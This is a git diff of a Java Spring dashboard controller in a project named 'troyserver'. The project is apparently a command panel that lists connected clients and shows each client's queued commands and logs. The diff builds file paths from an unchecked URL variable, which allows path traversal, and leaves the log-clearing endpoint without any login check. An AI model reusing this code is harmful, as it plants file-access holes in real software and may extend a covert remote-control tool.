@@ -1,10 +1,12 @@
 package ch.lebois.troyserver.controller;
 
+import ch.lebois.troyserver.service.ClientService;
 import ch.lebois.troyserver.service.CookieService;
 import ch.lebois.troyserver.service.FileService;
 import javax.servlet.http.HttpServletRequest;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
+import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
 
@@ -21,13 +23,15 @@ import org.springframework.web.bind.annotation.RequestMethod;
 @RequestMapping(value = {"dashboard", "dashboard/"})
 public class DashboardController {
 
+    private final ClientService clientService;
     private FileService fileService;
     private CookieService cookieService;
 
 
-    DashboardController(FileService fileService, CookieService cookieService) {
+    DashboardController(FileService fileService, CookieService cookieService, ClientService clientService) {
         this.fileService = fileService;
         this.cookieService = cookieService;
+        this.clientService = clientService;
     }
 
     @RequestMapping(method = RequestMethod.GET)
@@ -35,11 +39,27 @@ public class DashboardController {
         try {
             cookieService.getCurrentUser(request);
 
-            fileService.setFilePath("commands.properties");
+            model.addAttribute("clients", clientService.getClients());
+            return "homepage";
+        } catch (NullPointerException e) {
+            return "redirect:/login";
+        }
+
+    }
+
+
+    @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
+    public String getClientControlPanel(@PathVariable(value = "client") String client,
+                                        Model model, HttpServletRequest request) {
+        try {
+            cookieService.getCurrentUser(request);
+
+            fileService.setFilePath("commands\\command_" + client + ".properties");
             model.addAttribute("commands", fileService.read());
 
-            fileService.setFilePath("log.log");
+            fileService.setFilePath("logs\\client_" + client + ".log");
             model.addAttribute("log", fileService.read());
+            model.addAttribute("client", client);
             return "dashboard";
         } catch (NullPointerException e) {
             return "redirect:/login";
@@ -47,11 +67,11 @@ public class DashboardController {
 
     }
 
-    @RequestMapping(method = RequestMethod.POST)
-    public String clear() {
-        fileService.setFilePath("log.log");
+    @RequestMapping(value = {"{client}"}, method = RequestMethod.POST)
+    public String clearClientLogs(@PathVariable(value = "client") String client) {
+        fileService.setFilePath("logs\\client_" + client + ".log");
         fileService.clear();
-        return "redirect:/dashboard";
+        return "redirect:/dashboard/" + client;
     }
 
 }
